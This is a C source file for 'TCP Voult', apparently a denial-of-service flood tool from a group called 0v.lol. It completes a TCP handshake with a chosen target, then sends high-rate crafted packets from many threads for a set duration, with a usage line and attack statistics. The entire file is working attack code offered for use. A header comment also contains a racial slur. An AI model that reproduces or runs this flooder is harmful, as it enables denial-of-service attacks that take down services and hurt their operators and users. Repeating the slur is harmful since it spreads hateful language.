/*
 * TCP Voult 
 * by c0redev for 0v.lol
 * 
 * usage: sudo ./voult <target_ip> <port> <threads> <duration> [options]
 * // nigga
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>

struct voult_config {
    char target_ip[32];
    uint16_t target_port;
    uint32_t threads;
    uint32_t duration;
    
    uint8_t ip_tos;
    uint16_t ip_ident;
    uint8_t ip_ttl;
    uint8_t dont_frag;
    
    uint8_t urg_flag;
    uint8_t ack_flag;
    uint8_t psh_flag;
    uint8_t rst_flag;
    uint8_t syn_flag;
    uint8_t fin_flag;
    

    uint32_t payload_size;
    uint8_t payload_random;
    

    volatile uint8_t running;
    uint64_t total_packets;
    uint64_t total_bytes;
};

struct voult_data {
    uint32_t target_addr;
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t sport;
    uint16_t dport;
    uint32_t local_addr;
};

static struct voult_config config;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// xorshift rand_fuck
static uint32_t rand_state[4];

static void rand_init(void) {
    rand_state[0] = time(NULL);
    rand_state[1] = getpid() ^ getppid();
    rand_state[2] = clock();
    rand_state[3] = rand_state[2] ^ rand_state[1];
}

static uint32_t rand_next(void) {
    uint32_t t = rand_state[0];
    t ^= t << 11;
    t ^= t >> 8;
    rand_state[0] = rand_state[1];
    rand_state[1] = rand_state[2];
    rand_state[2] = rand_state[3];
    rand_state[3] ^= rand_state[3] >> 19;
    rand_state[3] ^= t;
    return rand_state[3];
}

static void rand_bytes(char *buf, int len) {
    while (len > 0) {
        if (len >= 4) {
            *((uint32_t *)buf) = rand_next();
            buf += 4;
            len -= 4;
        } else {
            *buf++ = rand_next() & 0xFF;
            len--;
        }
    }
}


static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    
    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

static uint16_t checksum_tcp(struct iphdr *iph, struct tcphdr *tcph, uint16_t data_len, int len) {
    const uint16_t *buf = (uint16_t *)tcph;
    uint32_t sum = 0;
    
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1)
        sum += *((uint8_t *)buf);
    
    sum += (iph->saddr >> 16) & 0xFFFF;
    sum += iph->saddr & 0xFFFF;
    sum += (iph->daddr >> 16) & 0xFFFF;
    sum += iph->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += data_len;
    
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    
    return (uint16_t)(~sum);
}

static uint32_t get_local_ip(void) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return 0;
    
    struct sockaddr_in server, local;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("8.8.8.8");
    server.sin_port = htons(53);
    
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return 0;
    }
    
    socklen_t len = sizeof(local);
    if (getsockname(sock, (struct sockaddr *)&local, &len) < 0) {
        close(sock);
        return 0;
    }
    
    close(sock);
    return local.sin_addr.s_addr;
}

static void* voult_thread(void *arg) {
    int thread_id = *(int *)arg;
    free(arg);
    

    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_sock < 0) {
        fprintf(stderr, "[thread %d] failed to create raw socket: %s\n", thread_id, strerror(errno));
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "[thread %d] setsockopt failed: %s\n", thread_id, strerror(errno));
        close(raw_sock);
        return NULL;
    }
    
    struct voult_data sd;
    sd.target_addr = inet_addr(config.target_ip);
    sd.local_addr = get_local_ip();
    
    if (sd.local_addr == 0) {
        fprintf(stderr, "[thread %d] failed to get local ip\n", thread_id);
        close(raw_sock);
        return NULL;
    }
    

    printf("[thread %d] establishing handshake with %s:%d...\n", 
           thread_id, config.target_ip, config.target_port);
    
    int conn_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (conn_sock < 0) {
        fprintf(stderr, "[thread %d] failed to create connection socket\n", thread_id);
        close(raw_sock);
        return NULL;
    }
    
    fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);
    
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = sd.target_addr;
    target_addr.sin_port = htons(config.target_port);
    
    connect(conn_sock, (struct sockaddr *)&target_addr, sizeof(target_addr));
    

    time_t start_time = time(NULL);
    int handshake_done = 0;
    
    while (time(NULL) - start_time < 10 && config.running) {
        char recv_buf[256];
        struct sockaddr_in recv_addr;
        socklen_t recv_len = sizeof(recv_addr);
        
        int ret = recvfrom(raw_sock, recv_buf, sizeof(recv_buf), MSG_DONTWAIT,
                          (struct sockaddr *)&recv_addr, &recv_len);
        
        if (ret > (int)(sizeof(struct iphdr) + sizeof(struct tcphdr))) {
            if (recv_addr.sin_addr.s_addr == sd.target_addr) {
                struct tcphdr *tcph = (struct tcphdr *)(recv_buf + sizeof(struct iphdr));
                
                if (tcph->source == htons(config.target_port) && tcph->syn && tcph->ack) {

                    sd.seq = ntohl(tcph->ack_seq);
                    sd.ack_seq = ntohl(tcph->seq) + 1;
                    sd.sport = tcph->dest;
                    sd.dport = tcph->source;
                    
                    handshake_done = 1;
                    printf("[thread %d] handshake established (seq=%u, ack=%u)\n",
                           thread_id, sd.seq, sd.ack_seq);
                    break;
                }
            }
        }
        
        usleep(10000); // 10ms
    }
    
    close(conn_sock);
    
    if (!handshake_done) {
        fprintf(stderr, "[thread %d] handshake timeout\n", thread_id);
        close(raw_sock);
        return NULL;
    }
    

    int pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + config.payload_size;
    char *packet = malloc(pkt_size);
    if (!packet) {
        fprintf(stderr, "[thread %d] malloc failed\n", thread_id);
        close(raw_sock);
        return NULL;
    }
    
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
    

    memset(iph, 0, sizeof(struct iphdr));
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = config.ip_tos;
    iph->tot_len = htons(pkt_size);
    iph->id = htons(config.ip_ident);
    iph->ttl = config.ip_ttl;
    if (config.dont_frag)
        iph->frag_off = htons(1 << 14);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = sd.local_addr;
    iph->daddr = sd.target_addr;
    

    memset(tcph, 0, sizeof(struct tcphdr));
    tcph->source = sd.sport;
    tcph->dest = sd.dport;
    tcph->doff = 5;
    tcph->window = htons(65535);
    tcph->urg = config.urg_flag;
    tcph->ack = config.ack_flag;
    tcph->psh = config.psh_flag;
    tcph->rst = config.rst_flag;
    tcph->syn = config.syn_flag;
    tcph->fin = config.fin_flag;
    

    if (config.payload_random)
        rand_bytes(payload, config.payload_size);
    else
        memset(payload, 'A', config.payload_size);
    
    printf("[thread %d] flooding started\n", thread_id);
    
    time_t end_time = time(NULL) + config.duration;
    uint64_t thread_packets = 0;
    uint64_t thread_bytes = 0;
    

    while (config.running && time(NULL) < end_time) {

        if (config.ip_ident == 0xFFFF)
            iph->id = rand_next() & 0xFFFF;
        
        if (config.payload_random)
            rand_bytes(payload, config.payload_size);
        
        tcph->seq = htonl(sd.seq++);
        tcph->ack_seq = htonl(sd.ack_seq);
        

        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        
        tcph->check = 0;
        tcph->check = checksum_tcp(iph, tcph, 
                                   htons(sizeof(struct tcphdr) + config.payload_size),
                                   sizeof(struct tcphdr) + config.payload_size);
        

        int sent = sendto(raw_sock, packet, pkt_size, MSG_NOSIGNAL,
                         (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (sent > 0) {
            thread_packets++;
            thread_bytes += sent;
        }
    }

    pthread_mutex_lock(&stats_mutex);
    config.total_packets += thread_packets;
    config.total_bytes += thread_bytes;
    pthread_mutex_unlock(&stats_mutex);
    
    printf("[thread %d] stopped (packets=%llu, bytes=%llu)\n",
           thread_id, (unsigned long long)thread_packets, (unsigned long long)thread_bytes);
    
    free(packet);
    close(raw_sock);
    return NULL;
}


static void sigint_handler(int sig) {
    (void)sig;
    printf("\n[*] stopping...\n");
    config.running = 0;
}


static void usage(const char *prog) {
    printf("TCP Voult Flood - aka evilhax\n");
    printf("by c0re_x64 for 0v.lol\n\n");
    printf("usage: sudo %s <target_ip> <port> <threads> <duration> [options]\n\n", prog);
    printf("arguments:\n");
    printf("  target_ip       target ip address\n");
    printf("  port            target port\n");
    printf("  threads         number of threads (1-256)\n");
    printf("  duration        attack duration in seconds\n\n");
    printf("options:\n");
    printf("  --tos <val>     ip tos (default: 0)\n");
    printf("  --ttl <val>     ip ttl (default: 64)\n");
    printf("  --ident <val>   ip ident (default: random)\n");
    printf("  --df            set don't fragment flag\n");
    printf("  --urg           set urg flag\n");
    printf("  --ack           set ack flag (default: on)\n");
    printf("  --psh           set psh flag (default: on)\n");
    printf("  --rst           set rst flag\n");
    printf("  --syn           set syn flag\n");
    printf("  --fin           set fin flag\n");
    printf("  --size <val>    payload size (default: 768)\n");
    printf("  --static        static payload (default: random)\n\n");
    printf("example:\n");
    printf("  sudo %s 1.2.3.4 80 16 60 --size 1024 --psh --ack\n\n", prog);
}

int main(int argc, char **argv) {
    if (argc < 5) {
        usage(argv[0]);
        return 1;
    }
    
    if (geteuid() != 0) {
        fprintf(stderr, "error: must run as root\n");
        return 1;
    }
    
    memset(&config, 0, sizeof(config));
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_port = atoi(argv[2]);
    config.threads = atoi(argv[3]);
    config.duration = atoi(argv[4]);
    
    config.ip_tos = 0;
    config.ip_ident = 0xFFFF;
    config.ip_ttl = 64;
    config.dont_frag = 1;
    
    config.ack_flag = 1;
    config.psh_flag = 1;
    
    config.payload_size = 768;
    config.payload_random = 1;
    config.running = 1;
    

    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--tos") == 0 && i + 1 < argc)
            config.ip_tos = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ttl") == 0 && i + 1 < argc)
            config.ip_ttl = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ident") == 0 && i + 1 < argc)
            config.ip_ident = atoi(argv[++i]);
        else if (strcmp(argv[i], "--df") == 0)
            config.dont_frag = 1;
        else if (strcmp(argv[i], "--urg") == 0)
            config.urg_flag = 1;
        else if (strcmp(argv[i], "--ack") == 0)
            config.ack_flag = 1;
        else if (strcmp(argv[i], "--psh") == 0)
            config.psh_flag = 1;
        else if (strcmp(argv[i], "--rst") == 0)
            config.rst_flag = 1;
        else if (strcmp(argv[i], "--syn") == 0)
            config.syn_flag = 1;
        else if (strcmp(argv[i], "--fin") == 0)
            config.fin_flag = 1;
        else if (strcmp(argv[i], "--size") == 0 && i + 1 < argc)
            config.payload_size = atoi(argv[++i]);
        else if (strcmp(argv[i], "--static") == 0)
            config.payload_random = 0;
    }
    

    if (config.threads < 1 || config.threads > 256) {
        fprintf(stderr, "error: threads must be 1-256\n");
        return 1;
    }
    
    if (config.duration < 1) {
        fprintf(stderr, "error: duration must be > 0\n");
        return 1;
    }
    
    if (config.payload_size > 1460) {
        fprintf(stderr, "warning: payload size > 1460 may cause fragmentation\n");
    }
    

    rand_init();
    signal(SIGINT, sigint_handler);
    signal(SIGTERM, sigint_handler);
    
    printf("\n");
    printf(" hope? \n");
    printf("\n");
    printf(" TCP Voult - by c0redev\n");
    printf(" for 0v.lol group\n");
    printf("\n");
    
    printf("[*] configuration:\n");
    printf("    target: %s:%d\n", config.target_ip, config.target_port);
    printf("    threads: %d\n", config.threads);
    printf("    duration: %d seconds\n", config.duration);
    printf("    payload: %d bytes (%s)\n", config.payload_size, 
           config.payload_random ? "random" : "static");
    printf("    tcp flags: %s%s%s%s%s%s\n",
           config.urg_flag ? "URG " : "",
           config.ack_flag ? "ACK " : "",
           config.psh_flag ? "PSH " : "",
           config.rst_flag ? "RST " : "",
           config.syn_flag ? "SYN " : "",
           config.fin_flag ? "FIN " : "");
    printf("\n");
    

    pthread_t *threads = malloc(config.threads * sizeof(pthread_t));
    if (!threads) {
        fprintf(stderr, "error: malloc failed\n");
        return 1;
    }
    
    printf("[*] launching %d threads...\n", config.threads);
    
    for (uint32_t i = 0; i < config.threads; i++) {
        int *tid = malloc(sizeof(int));
        *tid = i + 1;
        
        if (pthread_create(&threads[i], NULL, voult_thread, tid) != 0) {
            fprintf(stderr, "error: failed to create thread %d\n", i + 1);
            free(tid);
        }
        
        usleep(100000); // 100ms
    }
    
    printf("[*] all threads launched\n");
    printf("[*] attack running for %d seconds...\n", config.duration);
    printf("[*] press ctrl+c to stop early\n\n");
    

    for (uint32_t i = 0; i < config.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    

    printf("\n[*] attack completed\n");
    printf("    total packets: %llu\n", (unsigned long long)config.total_packets);
    printf("    total bytes: %llu (%.2f MB)\n", 
           (unsigned long long)config.total_bytes, config.total_bytes / 1024.0 / 1024.0);
    printf("    avg pps: %llu\n", (unsigned long long)(config.total_packets / config.duration));
    printf("    avg bps: %llu (%.2f Mbps)\n", 
           (unsigned long long)(config.total_bytes * 8 / config.duration),
           (config.total_bytes * 8 / config.duration) / 1024.0 / 1024.0);
    printf("\n");
    
    return 0;
}
